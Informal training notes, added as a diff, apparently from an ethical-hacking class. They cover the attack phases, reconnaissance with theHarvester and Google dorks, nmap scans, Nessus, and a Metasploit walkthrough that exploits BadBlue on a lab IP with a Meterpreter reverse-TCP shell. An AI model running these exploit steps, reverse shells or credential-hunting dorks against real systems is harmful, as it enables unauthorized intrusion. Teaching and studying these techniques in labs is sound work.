@@ -1,0 +1,199 @@
+
+Security
+--------------
+
+Day 1
+----------
+
+Hackers follow's these phases
+------------------------------
+
+1.Reconnaissance -- footprinting (Information Gathering)
+--------------
+		Attackers collect data .
+		Even minute information
+1. Active Reconnaissance (Directly try to get details fom target by directly hitting)
+2. Passive Reconnaissance (Collecting Data from Outside without the knowledge of the target souce)
+eg: Webserver version, database type, Web application type
+
+Passive gathering tools
+========================
+Wappalyzer(plugin for getting details such as service types , Versions , Os details , security details)
+
+www.netcraft.com
+
+
+2. Scanning
+--------------
+
+Try to identify Live IP's. 
+which ports are open
+which services are running on the host
+
+3. Gaining Access
+------------------
+
+Remote shell execution may give them shell access to the target machine
+
+4. Maintaining Access
+-----------------------
+
+planting malwares, so that they can achive access later
+
+5. Clearing Logs
+------------------
+
+Hackers will clear logs in the machine .
+eg: Audit logs, sys logs
+Kali linux
+-------------
+
+Reconnaissance Testing using kali linux
+-----------------------------------------
+
+theharvester -d hpe.com -l 50 -b google -f /root/hpe.html
+
+tool = harvester
+
+from = google sources
+
+==================================================
+
+google Hacking
+==============
+
+hacker site:microsoft.com
+
+intext:username intext:password ext:ext
+
+
+backup of your website without your permission
+---------------------------------------------------
+
+https://web.archive.org
+
+
+Phase 2
+--------------
+
+Scanning
+=============
+
+Port Scanning
+-----------------
+
+
+BadBlue Enterprise Edition (Tool)
+
+TCP Connect Scan
+-----------------
+Through TCP acknowledgement
+
+Establishing the connection and closing the connection.
+
+Getting details by directly contacting
+
+Sender - Syn
+Victim- Syn Ack
+sender -Ack
+
+Half open scanning(Syn Ack)
+------------------
+
+No Establishment.. But gets port details
+
+Sender -Syn
+Victim - Syn Ack 
+
+Only in Linux(Wont work on Windows)
+=============
+XMAS Scan
+FIN scan
+NULL
+
+
+Fin scan
+--------------
+nmap - command line
+zenmap- GUI
+
+launched Zenmap in kali
+
+command - nmap -sS   192.168.159.130(Windows machine IP)
+this commands will give me details about openports and services
+
+Hacker origin will be blocked by proxy
+
+nmap -sS -sV IP
+----------------
+-sV == service Versions
+
+to get service versions and other details
+
+To get  more accurate details about the OS
+------------------------------------------
+
+nmap -sS -A 192.168.159.130 -A -P 100-200
+
+-P = port number
+
+Passive Scanning- POF
+
+Vulnerability Analysis
+---------------------------
+
+using Nessus(Penetration test)
+
+
+free edition and premium edition
+
+in free edition - 16 IP at a time
+
+Classified
+---------------
+
+Critical
+High
+Medium
+low
+info
+
+Nessus looks for host vulnerability
+
+white box scan -- with credentials
+Black box scan -- without credentials
+
+trying attack
+------------
+Metaexploit or metasploit
+
+msfconsole -q (kali linux)
+
+msf > use exploit/windows/http/badblue_passthru(badblue vulnerability module)
+
+msf > set RHOST 192.168.159.130
+
+msf > set RPORT 8080
+
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST IP (localhost ip)
+
+exploit
+
+meterpreter - payload
+
+In windows
+--------------
+
+shell
+cd Windows/system32
+calc.exe
+
+
+launch calculator
+
+payload - what you achieve from the exploit
+
+
+
